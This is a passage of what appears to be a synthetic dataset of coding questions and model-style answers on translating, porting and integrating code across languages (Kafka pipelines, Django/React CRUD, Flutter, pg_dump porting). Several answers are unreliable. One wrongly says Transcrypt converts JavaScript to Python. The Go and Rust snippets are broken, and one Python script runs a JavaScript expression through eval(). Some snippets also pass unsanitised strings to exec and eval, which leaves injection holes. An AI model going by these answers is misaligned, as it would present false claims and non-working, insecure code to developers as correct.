main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}\n\"\"\"\n\nprint(detect_code_language(code_snippet))\n```\nThis script defines a function `detect_code_language` that takes a code snippet as input and returns the detected language. In the example, a Java code snippet is provided, and the script should output `java`.\n\nQuestion 2: Write a JavaScript function that translates a given JavaScript code snippet into equivalent Python code using a code transformation library.\n\nConcept: \"Code Translation\"\n\nSolution:\nUnfortunately, there's no widely used, built-in library for directly translating JavaScript to Python. However, you can use a third-party API like `transcrypt` to transpile JavaScript to Python. Note that this is not a perfect translation and might require some manual adjustments.\n\nTo use `transcrypt`, you first need to install it:\n```bash\npip install transcrypt\n```\nNow, create a JavaScript file called `code_transpiler.js`:\n```javascript\nconst { exec } = require('child_process');\nconst fs = require('fs');\n\nfunction transpileToPython(jsCode, callback) {\n    const command = `python -m transcrypt -b -n -m ${Date.now()} ${jsCode}`;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            callback(`Error: ${error.message}`);\n        } else if (stderr) {\n            callback(`Error: ${stderr}`);\n        } else {\n            const pythonCode = fs.readFileSync(`${Date.now()}.py`, 'utf-8');\n            callback(pythonCode);\n        }\n    });\n}\n\nconst jsCode = `\nfunction greet(name) {\n    console.log(`Hello, ${name}!`);\n}\ngreet('World');\n`;\n\ntranspileToPython(jsCode, (pythonCode) => {\n    console.log(pythonCode);\n});\n```\nThis script uses Node.js `child_process` to execute the `transcrypt` command-line tool. It takes a JavaScript code snippet as input, transpiles it to Python, and outputs the result. The example JavaScript code is a simple greeting function, and the transpiled Python code will be printed to the console.\n\nKeep in mind that this solution requires a local installation of Python and `transcrypt`, and the quality of the translation might vary. It's recommended to review and refine the transpiled code manually."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Automatic code localization", "Complexity_Level": "extremely difficult", "Response": "Concept: Automatic Code Localization\n\nAutomatic code localization is a complex problem that involves identifying the specific programming language of a given code snippet or file without prior knowledge of the language. It's often used in multi-language development environments or when processing large code repositories with mixed-language content.\n\nQuestion 1: Develop an AI-based algorithm that accurately identifies the programming language of a given code snippet with a very high degree of precision, even for ambiguous or hybrid code.\n\nSolution:\nWe can use a combination of deep learning techniques like Convolutional Neural Networks (CNN) and Recurrent Neural Networks (RNN) to analyze the syntax and structure of code snippets. The model will be trained on a large dataset of code snippets from different languages.\n\nExample Python code using TensorFlow and Keras:\n```python\nimport tensorflow as tf\nfrom tensorflow.keras.preprocessing.text import Tokenizer\nfrom tensorflow.keras.preprocessing.sequence import pad_sequences\n\n# Load and process a large dataset of code snippets\ndef load_dataset():\n    # Implement your own code to load and preprocess the dataset\n    pass\n\n# Tokenize code snippets\ntokenizer = Tokenizer()\ntokenizer.fit_on_texts(dataset)\nsequences = tokenizer.texts_to_sequences(dataset)\n\n# Pad sequences to the same length\nmax_length = 1000  # Adjust based on longest snippet\npadded_sequences = pad_sequences(sequences, maxlen=max_length, padding='post')\n\n# Build and compile the model\nmodel = tf.keras.Sequential([\n    tf.keras.layers.Embedding(len(tokenizer.word_index)+1, 128, input_length=max_length),\n    tf.keras.layers.Conv1D(128, 5, activation='relu'),\n    tf.keras.layers.MaxPooling1D(pool_size=4),\n    tf.keras.layers.LSTM(128),\n    tf.keras.layers.Dense(128, activation='relu'),\n    tf.keras.layers.Dropout(0.2),\n    tf.keras.layers.Dense(len(languages), activation='softmax')\n])\nmodel.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\n\n# Train the model\nmodel.fit(padded_sequences, labels, epochs=10, validation_split=0.2)\n\n# Use the model for prediction\ndef predict_language(code_snippet):\n    sequence = tokenizer.texts_to_sequences([code_snippet])\n    padded_sequence = pad_sequences(sequence, maxlen=max_length, padding='post')\n    return model.predict(padded_sequence)\n```\nQuestion 2: Implement a complex rule-based system that uses syntax and identifier characteristics to determine the programming language of a given code snippet. The system should handle corner cases and edge cases effectively.\n\nSolution:\nWe can create a rule-based system using a combination of regular expressions, tokenization, and statistical analysis to identify language-specific patterns.\n\nExample Python code using regular expressions:\n```python\nimport re\n\ndef tokenize_code(code):\n    # Tokenize the code based on whitespace and punctuation\n    return re.findall(r'\\b\\w+\\b|\\S', code)\n\ndef language_classifier(code):\n    rules = {\n        'python': ['def', 'import', 'class'],\n        'java': ['public', 'class', 'import'],\n        'javascript': ['function', 'var', 'let', 'const'],\n        # Add more rules for other languages\n    }\n\n    tokens = tokenize_code(code)\n    language_scores = {lang: 0 for lang in rules.keys()}\n\n    for token in tokens:\n        for lang, keywords in rules.items():\n            if token in keywords:\n                language_scores[lang] += 1\n\n    max_score, max_lang = max(language_scores.items(), key=lambda x: x[1])\n    return max_lang\n\n# Test the classifier\ncode_snippet = \"\"\"\ndef hello_world():\n    print(\"Hello, world!\")\n\"\"\"\nprint(language_classifier(code_snippet))  # Output: python\n```\nPlease note that these are simplified examples and achieving high accuracy for code localization in real-world scenarios requires extensive data, fine-tuning, and possibly a combination of both AI-based and rule-based approaches."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Platform-specific adaptations", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are working on a cross-platform application that requires date formatting in both Python and JavaScript. The application should display dates in the format \"dd-mm-yyyy\" on the server-side (Python) and \"mm/dd/yyyy\" on the client-side (JavaScript). Create a medium-complexity problem related to adapting date formatting for these two languages.\n\nConcept: Platform-specific adaptations\n\nPython Solution:\n```python\nimport datetime\n\ndef format_date_python(date):\n    return date.strftime(\"%d-%m-%Y\")\n\n# Example usage\nserver_date = datetime.datetime.now()\nformatted_server_date = format_date_python(server_date)\nprint(formatted_server_date)\n```\n\nJavaScript Solution:\n```javascript\nfunction formatDateJavaScript(date) {\n    return `${date.getMonth() + 1}/${date.getDate()}/${date.getFullYear()}`;\n}\n\n// Example usage\nlet clientDate = new Date();\nlet formattedClientDate = formatDateJavaScript(clientDate);\nconsole.log(formattedClientDate);\n```\n\nQuestion 2:\nProblem: You're developing a RESTful API with a Python backend (using Flask) and a JavaScript frontend. The backend needs to return a JSON response with timestamps in ISO 8601 format, while the frontend should display them in a user-friendly format \"dd-mm-yyyy HH:MM\". Implement a medium complexity solution for adapting timestamp formatting in both languages.\n\nConcept: Platform-specific adaptations\n\nPython Solution (using Flask):\n```python\nfrom flask import Flask, jsonify\nfrom datetime import datetime\n\napp = Flask(__name__)\n\ndef format_date_server(timestamp):\n    return timestamp.strftime(\"%Y-%m-%dT%H:%M:%S%z\")\n\n@app.route('/api/timestamp')\ndef get_timestamp():\n    current_time = datetime.now()\n    formatted_time = format_date_server(current_time)\n    return jsonify({'timestamp': formatted_time})\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nJavaScript Solution:\n```javascript\nfunction formatDateClient(isoTimestamp) {\n    let date = new Date(isoTimestamp);\n    let day = date.getDate();\n    let month = date.getMonth() + 1;\n    let year = date.getFullYear();\n    let hours = date.getHours();\n    let minutes = date.getMinutes();\n\n    // Add leading zeros if necessary\n    day = day < 10 ? '0' + day : day;\n    month = month < 10 ? '0' + month : month;\n    hours = hours < 10 ? '0' + hours : hours;\n    minutes = minutes < 10 ? '0' + minutes : minutes;\n\n    return `${day}-${month}-${year} ${hours}:${minutes}`;\n}\n\n// Example usage\nlet receivedTimestamp = '2023-04-01T14:30:00+00:00';\nlet formattedTimestamp = formatDateClient(receivedTimestamp);\nconsole.log(formattedTimestamp);\n```"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Platform-specific adaptations", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Design a highly concurrent and platform-specific data streaming pipeline using different programming languages (Java, Python, and Go) to ingest, process, and store real-time financial data from multiple sources. The pipeline should be able to handle data loss resilience, maintain data order across language boundaries, and seamlessly integrate with a distributed messaging system like Apache Kafka.\n\nSolution:\nConcept: Distributed Systems, Concurrency, Message Brokers, Inter-language communication\n\nJava (Kafka Consumer):\n```java\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.ConsumerRecords;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\n\nimport java.util.Collections;\nimport java.util.Properties;\n\npublic class JavaConsumer {\n    public static void main(String[] args) {\n        Properties props = new Properties();\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, \"localhost:9092\");\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, \"java-consumer-group\");\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.StringDeserializer\");\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, \"org.apache.kafka.common.serialization.StringDeserializer\");\n        KafkaConsumer<String, String> consumer = new KafkaConsumer<>(props);\n        consumer.subscribe(Collections.singletonList(\"financial-data\"));\n        while (true) {\n            ConsumerRecords<String, String> records = consumer.poll(100);\n            for (ConsumerRecord<String, String> record : records)\n                System.out.printf(\"offset = %d, key = %s, value = %s%n\", record.offset(), record.key(), record.value());\n        }\n    }\n}\n```\nPython (Data Processing):\n```python\nimport kafka\nimport json\n\ndef process_data(data_str):\n    data = json.loads(data_str)\n    # ... Perform complex financial data processing ...\n    return json.dumps(processed_data)\n\nconsumer = kafka.KafkaConsumer('financial-data', bootstrap_servers=['localhost:9092'])\nfor message in consumer:\n    data = message.value.decode()\n    processed_data = process_data(data)\n    # Send processed data to Go producer\n    go_producer.send_data(processed_data)\n```\nGo (Kafka Producer & Data Storage):\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"context\"\n\t\"encoding/json\"\n\t\"log\"\n\n\t\"github.com/Shopify/sarama\"\n)\n\ntype Data struct {\n\t// ... Define the structure for financial data ...\n}\n\nfunc sendDataToKafka(data string) {\n\tproducer, err := sarama.NewSyncProducer([]string{\"localhost:9092\"}, nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer producer.Close()\n\n\tmsg := &sarama.ProducerMessage{\n\t\tTopic:     \"processed-financial-data\",\n\t\tValue:     sarama.StringEncoder(data),\n\t Partition: 0, // For simplicity, assume a single-partition topic\n\t}\n\t_, _, err = producer.SendMessage(msg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc main() {\n\tgo sendDataToKafka <-chan string // Connect Python's processed_data to this channel\n\t// ... Connect to a database and store processed data ...\n}\n```\nThis solution demonstrates a distributed system with a Java Kafka consumer, a Python data processor, and a Go Kafka producer that stores the processed data. It handles concurrency through the use of asynchronous message passing, maintains data order through Kafka partitions, and ensures resilience to data loss by using a reliable messaging system.\n\nQuestion 2:\nProblem: Implement a real-time translation system that"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Framework-specific code generation", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You have to create a web application that allows users to add, edit, and delete blog posts using a backend framework. The frontend should be built using React, while the backend is implemented with Django. Generate a medium complexity problem related to generating CRUD (Create, Read, Update, Delete) operations for blog posts in both React and Django.\n\nConcept: \"Web Development\" (Subtopics: \"Frontend Development\" and \"Backend Development\")\n\nSolution (React):\n```jsx\n// React component for displaying blog posts\nimport React, { useState, useEffect } from 'react';\nimport axios from 'axios';\n\nconst BlogPostList = () => {\n  const [posts, setPosts] = useState([]);\n\n  useEffect(() => {\n    const fetchData = async () => {\n      const result = await axios.get('http://localhost:8000/api/posts/');\n      setPosts(result.data);\n    };\n    fetchData();\n  }, []);\n\n  const handleDelete = (postId) => {\n    axios.delete(`http://localhost:8000/api/posts/${postId}/`).then(() => {\n      const newPosts = posts.filter((post) => post.id !== postId);\n      setPosts(newPosts);\n    });\n  };\n\n  return (\n    <div>\n      {posts.map((post) => (\n        <div key={post.id}>\n          <h2>{post.title}</h2>\n          <p>{post.content}</p>\n          <button onClick={() => handleDelete(post.id)}>Delete</button>\n        </div>\n      ))}\n    </div>\n  );\n};\n\nexport default BlogPostList;\n```\n\nSolution (Django):\n```python\n# models.py\nfrom django.db import models\n\nclass BlogPost(models.Model):\n    title = models.CharField(max_length=200)\n    content = models.TextField()\n    created_at = models.DateTimeField(auto_now_add=True)\n    updated_at = models.DateTimeField(auto_now=True)\n\n    def __str__(self):\n        return self.title\n\n# serializers.py\nfrom rest_framework import serializers\nfrom .models import BlogPost\n\nclass BlogPostSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = BlogPost\n        fields = ['id', 'title', 'content', 'created_at', 'updated_at']\n\n# views.py\nfrom rest_framework import generics\nfrom .models import BlogPost\nfrom .serializers import BlogPostSerializer\n\nclass BlogPostListCreateView(generics.ListCreateAPIView):\n    queryset = BlogPost.objects.all()\n    serializer_class = BlogPostSerializer\n\nclass BlogPostDeleteView(generics.DestroyAPIView):\n    queryset = BlogPost.objects.all()\n    serializer_class = BlogPostSerializer\n\n# urls.py\nfrom django.urls import path\nfrom .views import BlogPostListCreateView, BlogPostDeleteView\n\nurlpatterns = [\n    path('api/posts/', BlogPostListCreateView.as_view(), name='post-list-create'),\n    path('api/posts/<int:pk>/', BlogPostDeleteView.as_view(), name='post-delete'),\n]\n```\n\nQuestion 2:\nProblem: You're building a cross-platform mobile application using Flutter, and you need to fetch data from an API and display it in a ListView. Additionally, implement a functionality to refresh the data by pulling down on the ListView.\n\nConcept: \"Mobile Development\" (Subtopics: \"Cross-Platform Development\")\n\nSolution (Flutter):\n```dart\nimport 'dart:convert';\nimport 'package:flutter/material.dart';\nimport 'package:http/http.dart' as http;\n\nvoid main() => runApp(MyApp());\n\nclass MyApp extends StatelessWidget {\n  @override\n  Widget build(BuildContext context) {\n    return MaterialApp(\n      title: 'Flutter Demo',\n      theme: ThemeData(\n        primarySwatch: Colors.blue,\n      ),\n      home: MyHomePage(title: 'Flutter Demo Home Page'),\n    );\n  }\n}\n\nclass MyHomePage extends StatefulWidget {\n  MyHomePage({Key? key, required this.title}) : super(key: key);\n\n  final String title;\n\n  @override\n  _MyHomePageState createState() => _MyHomePageState();\n}\n\nclass _MyHomePageState extends State<MyHomePage> {\n  List<String> items = [];\n  bool _isLoading = false;\n\n  Future<void> fetchData() async {\n    setState(() {\n      _isLoading = true;\n    });\n\n    final response = await http.get(Uri.parse('https://jsonplaceholder.typicode.com/posts'));\n    if (response.statusCode == 200) {\n      final List<dynamic> data = json.decode(response.body);\n      setState(() {\n        items = data.map((item) => item['title']).toList();\n      });\n    } else {\n      throw Exception('Failed to load data');\n    }\n\n    setState(() {\n      _isLoading = false;\n    });\n  }\n\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      appBar: AppBar(\n        title: Text(widget.title),\n      ),\n      body: RefreshIndicator(\n        onRefresh: fetchData,\n        child: ListView.builder(\n          itemCount: items.length,\n          itemBuilder: (context, index) {\n            return ListTile(\n              title: Text(items[index]),\n              leading: Icon(Icons.book),\n              trailing: IconButton(icon: Icon(Icons.delete), onPressed: () {}),\n            );\n          },\n        ),\n      ),\n      floatingActionButton: FloatingActionButton(\n        onPressed: fetchData,\n        tooltip: 'Refresh Data',\n        child: Icon(Icons.refresh),\n      ),\n    );\n  }\n}\n```\nIn these examples, we've demonstrated a medium complexity problem of creating a CRUD operation for blog posts in a React application with a Django backend and fetching data from an API for a Flutter mobile app."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Framework-specific code generation", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a highly scalable, real-time translation system that converts code written in Python to equivalent Rust code using a custom intermediate representation (IR) and a deep learning-based model. The system should handle complex control structures, functions, and object-oriented programming concepts.\n\nConcept: \"Code Generation\"\n\nSolution:\nTo solve this problem, we can create a pipeline that consists of a Python parser, IR generation, a deep learning model, and a Rust code generator. The Python parser will convert Python code into an abstract syntax tree (AST), which is then transformed into IR. The IR will be used as input for the deep learning model to generate Rust code.\n\n1. Parse Python code into AST:\n```python\nimport ast\n\ndef parse_python_code(code):\n    ast_tree = ast.parse(code)\n    return ast_tree\n```\n1. Generate IR from AST:\n```python\ndef generate_intermediate_representation(ast_tree):\n    # Implement AST to IR transformation\n    # ...\n    ir = IR()  # IR class represents the intermediate representation\n    return ir\n```\n1. Train a deep learning model to generate Rust code from IR:\n```python\n# This part would involve a complex model architecture and large dataset of Python-Rust code pairs\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import LSTM, Dense\n\ndef build_and_train_model():\n    model = Sequential()\n    model.add(LSTM(256, input_shape=(None, num_ir_tokens), return_sequences=True))\n    model.add(LSTM(128))\n    model.add(Dense(num_rust_tokens, activation='softmax'))\n    model.compile(loss='categorical_crossentropy', optimizer='adam')\n    # Train the model on a large dataset of Python-Rust code pairs\n    # model.fit()\n    return model\n```\n1. Convert IR back to Rust code:\n```python\ndef generate_rust_code(ir, model):\n    # Generate Rust code using the trained model and IR\n    rust_code = model.predict(ir)\n    # Decode and format the Rust code\n    formatted_rust_code = format_rust_code(rust_code)\n    return formatted_rust_code\n```\nNote: This is an oversimplified example, and the actual implementation would involve a more sophisticated deep learning architecture, handling control flows, data structures, and object-oriented concepts.\n\nQuestion 2:\nProblem: Create a framework that automatically generates tests for complex C++ applications with multiple layers (UI, business logic, and database), leveraging dependency injection and mock objects to ensure high code coverage.\n\nConcept: \"Testing\"\n\nSolution:\nTo solve this problem, a custom testing framework with C++ support for dependency injection and mocking will be built. The framework should analyze the code structure, generate test cases, and create mock objects for dependencies.\n\n1. Analyze C++ code structure:\n```cpp\n#include <iostream>\n#include <fstream>\n\nclass CodeAnalyzer {\npublic:\n    std::vector<std::string> analyze(const std::string& filePath) {\n        std::vector<std::string> classes;\n        // Implement code to extract class and function information from the given C++ file\n        // ...\n        return classes;\n    }\n};\n```\n1. Generate test cases:\n```cpp\nclass TestGenerator {\npublic:\n    void generate(const std::vector<std::string>& classes, const std::string& outputDir) {\n        for (const std::string& className : classes) {\n            // Implement code to generate a test case for each class and function\n            // ...\n            std::ofstream testFile(outputDir + className + \"_test.cpp\");\n            testFile << \"Generated test code for \" << className;\n            testFile.close();\n        }\n    }\n};\n```\n1. Create mock objects for dependencies:\n```cpp\ntemplate <typename T>\nclass MockObject {\npublic:\n    virtual ~MockObject() {}\n    virtual T methodToMock() = 0;\n};\n\ntemplate <typename T>\nstd::unique_ptr<MockObject<T>> createMockObject() {\n    // Implement code to create a mock object for the given type T\n    // ...\n    return std::unique_ptr<MockObject<T>>(new MockObject<T>());\n}\n```\n1. Dependency injection:\n```cpp\nclass MyClass {\npublic:\n    MyClass(std::unique_ptr<MockObject<T>> dependency) : _dependency(std::move(dependency)) {}\n\n    void doSomething() {\n        // Use the mock object instead of the actual dependency\n        T result = _dependency->methodToMock();\n        // ...\n    }\n\nprivate:\n    std::unique_ptr<MockObject<T>> _dependency;\n};\n```\nThis example demonstrates an outline of the solution, but the actual implementation would require a deep understanding of C++ and testing principles to generate meaningful tests and mocks for complex scenarios."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Code porting for different OS", "Complexity_Level": "medium", "Response": "Question 1: You have a Python script that uses a specific library (e.g., `psycopg2` for PostgreSQL database access) which works well on Linux, but you need to port it to run on Windows. Write a medium complexity problem related to code porting and provide a solution to ensure compatibility.\n\nProblem: The Python script uses `subprocess` to execute a system command that is specific to Linux (e.g., `pg_dump` for PostgreSQL backups). The script needs to be adapted to work on Windows, where the `pg_dump` command is not available, but a Windows-specific binary, `pg_dump.exe`, is present in the PATH.\n\nSolution:\n```python\nimport os\nimport subprocess\nimport platform\n\ndef run_pg_dump_command(database_name):\n    system = platform.system()\n    \n    if system == 'Linux':\n        command = ['pg_dump', '-U', 'your_user', '-F', 'c', '-b', '-v', database_name, '-f', 'backup.dump']\n    elif system == 'Windows':\n        command = ['pg_dump.exe', '-U', 'your_user', '-F', 'c', '-b', '-v', database_name, '-f', 'backup.dump']\n    else:\n        raise ValueError(f\"Unsupported operating system: {system}\")\n        \n    try:\n        subprocess.check_call(command)\n        print(\"Backup completed successfully.\")\n    except subprocess.CalledProcessError as e:\n        print(f\"Error occurred: {e}\")\n\n# Usage\nrun_pg_dump_command('my_database')\n```\nConcept: Platform-specific code adaptation\n\nQuestion 2: You have a JavaScript application that utilizes Node.js for server-side rendering. This application uses `fs` (file system) module to read and write files. The code works fine on Unix-based systems, but you need to ensure compatibility with Windows.\n\nProblem: The `fs` module uses Unix-specific file path separators (`/`) which might cause errors on Windows where the path separator is (`\\`).\n\nSolution:\n```javascript\nconst fs = require('fs');\nconst path = require('path');\n\nfunction readFileAndWriteBackup(filePath) {\n    const fileName = path.basename(filePath);\n    const backupPath = path.join(path.dirname(filePath), `backup_${fileName}`);\n\n    // Ensure platform-specific path separator\n    const normalizedBackupPath = path.normalize(backupPath);\n\n    fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) {\n            console.error(`Error reading file: ${err}`);\n            return;\n        }\n\n        fs.writeFile(normalizedBackupPath, data, 'utf8', (writeErr) => {\n            if (writeErr) {\n                console.error(`Error writing backup file: ${writeErr}`);\n            } else {\n                console.log(`Backup created: ${normalizedBackupPath}`);\n            }\n        });\n    });\n}\n\n// Usage\nreadFileAndWriteBackup('/path/to/your/file.txt');\n```\nConcept: Platform-agnostic file path handling"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Code porting for different OS", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex and highly optimized C++ codebase for a real-time audio processing application, develop a fully functional port to the Rust programming language while maintaining the same performance on both Windows and Linux operating systems. The codebase extensively uses multi-threading, shared memory, and hardware acceleration.\n\n**Concept**: Code Porting, Multiprocessing, Platform-specific libraries\n\n**Solution**:\nTo port the audio processing application from C++ to Rust, we'll need to maintain the performance and compatibility across Windows and Linux. Here's a high-level approach:\n\n1. Analyze the C++ codebase to understand the architecture, multi-threading patterns, and hardware acceleration techniques.\n2. Choose Rust libraries that offer equivalent functionality to the C++ libraries used, such as `cpal` for audio I/O, `rayon` for parallel processing, and `rust-vst` or `rust-sfml` for platform-specific interfaces.\n3. Port the core algorithms to Rust, maintaining the same data structures and performance characteristics.\n4. Adapt the threading model to Rust's ownership and borrowing system, potentially using `Arc` and `Mutex` for shared data.\n\nHere's an example of porting a simple audio processing function from C++ to Rust:\n\nC++ code:\n```cpp\n#include <vector>\n#include <mutex>\n#include <shared_mutex>\n\nstd::vector<float> audioData;\nstd::shared_mutex audioMutex;\n\nvoid processAudio(float* input, float* output, size_t length) {\n    std::shared_lock<std::shared_mutex> readLock(audioMutex);\n    for (size_t i = 0; i < length; ++i) {\n        output[i] = input[i] * audioData[i];\n    }\n    readLock.unlock();\n}\n```\nRust code:\n```rust\nuse std::sync::{Arc, Mutex};\nuse std::vec::Vec;\n\ntype AudioData = Arc<Mutex<Vec<f32>>>;\n\nfn process_audio(input: &[f32], output: &mut [f32], audio_data: &AudioData) {\n    let audio_data_guard = audio_data.lock().unwrap();\n    for (output, input) in output.iter_mut().zip(input) {\n        *output = *input * audio_data_guard[*output as usize];\n    }\n}\n```\nQuestion 2:\nYou have a Python Flask application using SQLite as its database that runs smoothly on Linux. The challenge is to port it to a Windows environment while replacing SQLite with a PostgreSQL database, ensuring seamless data migration and maintaining the same performance and functionality.\n\n**Concept**: Code Porting, Databases, ORM\n\n**Solution**:\n1. Identify all database-related code in the Flask application, focusing on database models and queries.\n2. Replace the SQLite dependency with the `psycopg2` library for PostgreSQL in the Python project.\n3. Update the Flask application to use SQLAlchemy's PostgreSQL dialect instead of SQLite.\n4. Migrate the data from SQLite to PostgreSQL using a script that reads data from SQLite and writes it into PostgreSQL.\n5. Modify any platform-specific code (e.g., file paths, environment variables) to work on both Windows and Linux.\n\nHere's a high-level example of the database configuration change:\n\nOriginal SQLite configuration:\n```python\nfrom flask_sqlalchemy import SQLAlchemy\n\ndb = SQLAlchemy()\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'\ndb.init_app(app)\n```\nPorted to PostgreSQL configuration:\n```python\nimport os\nfrom flask_sqlalchemy import SQLAlchemy\nimport psycopg2\n\ndb = SQLAlchemy()\napp = Flask(__name__)\n\n# Set the PostgreSQL connection string\npostgres_uri = os.environ.get('POSTGRES_URI', 'postgresql://user:password@host:port/dbname')\napp.config['SQLALCHEMY_DATABASE_URI'] = postgres_uri\ndb.init_app(app)\n\n# For Windows, you might need to set the psycopg2 path\nif os.name == 'nt':\n    # Add psycopg2 binary to path (if needed)\n    os.environ['PATH'] += os.pathsep + r'C:\\path\\to\\psycopg2\\bin'\n```\nNote that this is a simplified example. In a real scenario, you'll need to handle data migration, testing, and potential performance optimization for the new database system."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Multi-language code integration", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a web application that allows users to input a mathematical expression in multiple programming languages (Python, JavaScript, and Ruby) and displays the evaluated result for each language on a single page.\n\nConcept: Multi-language code integration\n\nSolution:\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Multi-Language Expression Evaluator</title>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js\" type=\"text/javascript\" charset=\"utf-8\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/mode-python.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/mode-javascript.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/mode-ruby.min.js\"></script>\n    <style>\n        .result {\n            margin-top: 10px;\n        }\n    </style>\n</head>\n<body>\n    <h1>Expression Evaluator</h1>\n    <div id=\"editor\">\n        // Enter your mathematical expression here\n    </div>\n    <button onclick=\"evaluateExpression()\">Evaluate</button>\n    <div>\n        <h2>Results</h2>\n        <div class=\"result\" id=\"python_result\"></div>\n        <div class=\"result\" id=\"javascript_result\"></div>\n        <div class=\"result\" id=\"ruby_result\"></div>\n    </div>\n\n    <script>\n        const editor = ace.edit(\"editor\");\n        editor.session.setMode(\"ace/mode/python\");\n\n        async function evaluateExpression() {\n            const expression = editor.getValue().trim();\n            const results = await fetch(`/evaluate?expression=${encodeURIComponent(expression)}`);\n            const data = await results.json();\n\n            document.getElementById(\"python_result\").innerText = `Python: ${data.pythonResult}`;\n            document.getElementById(\"javascript_result\").innerText = `JavaScript: ${data.javascriptResult}`;\n            document.getElementById(\"ruby_result\").innerText = `Ruby: ${data.rubyResult}`;\n        }\n    </script>\n</body>\n</html>\n```\nThis HTML page contains an ACE editor for entering expressions, and a button to trigger evaluation. The `evaluateExpression` function sends the expression to a server for evaluation in Python, JavaScript, and Ruby. The server-side code is not provided in this example, but it would be responsible for handling the language-specific evaluations.\n\nQuestion 2:\nProblem: Create a command-line tool that reads a CSV file, processes the data using a Python library, and then writes the results to a new CSV file, while also providing a command-line option to filter the data using a JavaScript function.\n\nConcept: Multi-language code integration\n\nSolution (Python with `subprocess` module for JS execution):\n```python\nimport csv\nimport subprocess\n\ndef process_data_py(data):\n    # Python processing logic\n    pass\n\ndef process_data_js(data):\n    js_code = \"\"\"\n    function process(data) {\n        // JavaScript processing logic\n        return data.map(item => item * 2);\n    }\n    process(data);\n    \"\"\"\n    result = subprocess.check_output(['node', '-e', js_code], text=True, input='\\n'.join(data))\n    return [int(item) for item in result.strip().split('\\n')]\n\ndef filter_data(data, filter_func):\n    return list(filter(filter_func, data))\n\ndef main():\n    input_file = 'input.csv'\n    output_file = 'output.csv'\n    filter_js = 'return item > 10'\n\n    with open(input_file, 'r') as f:\n        data = [int(line) for line in f]\n\n    processed_data = process_data_py(data)\n    filtered_data = filter_data(processed_data, lambda x: eval(filter_js))\n\n    with open(output_file, 'w', newline='') as f:\n        writer = csv.writer(f)\n        writer.writerow(filtered_data)\n\nif __name__ == '__main__':\n    main()\n```\nThis Python script reads from an input CSV file, processes data with a Python function and a JavaScript function using `subprocess`, and then filters the data based on a JavaScript expression. The results are then written to a new CSV file. Note that the JavaScript code is embedded as a string in the Python script, and the filtering is done using Python's `eval()` function with the provided JavaScript expression."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Multi-language code integration", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a complex microservices architecture that integrates code from multiple languages, enabling seamless communication and data exchange between services. Implement a C# service for user authentication, a Python service for data processing, and a Java service for storing and retrieving processed data from a distributed database.\n\n**Solution:**\n\nConcept: Microservices, REST APIs, JSON, gRPC, Docker, Kubernetes\n\nHere's a high-level overview of the solution:\n\n1. C# User Authentication Service (gRPC):\n```csharp\n// AuthService.cs\npublic class AuthService : AuthService.AuthServiceBase\n{\n    public async Task<AuthResponse> Authenticate(AuthRequest request, ServerCallContext context)\n    {\n        // Authenticate user logic\n        var response = new AuthResponse { Token = \"JWT_TOKEN\" };\n        return response;\n    }\n}\n\n// Program.cs\npublic class Program\n{\n    public static void Main(string[] args)\n    {\n        var host = Host.CreateDefaultBuilder(args)\n            .AddGrpc()\n            .Build();\n\n        host.Run();\n    }\n}\n```\n1. Python Data Processing Service (gRPC client for C# service, REST API for Java service):\n```python\n# app.py\nimport grpc\nfrom concurrent import futures\nimport service_pb2\nimport service_pb2_grpc\n\nclass DataProcessor(service_pb2_grpc.DataProcessorServicer):\n    def Process(self, request, context):\n        # Process data logic\n        processed_data = request.input_data * 2\n        return service_pb2.ProcessedDataResponse(data=processed_data)\n\ndef start_server():\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    service_pb2_grpc.add_DataProcessorServicer_to_server(DataProcessor(), server)\n    server.add_insecure_port('[::]:50051')\n    server.start()\n\nstart_server()\n\n# REST API for Java service\nfrom flask import Flask, jsonify, request\napp = Flask(__name__)\n\n@app.route('/process', 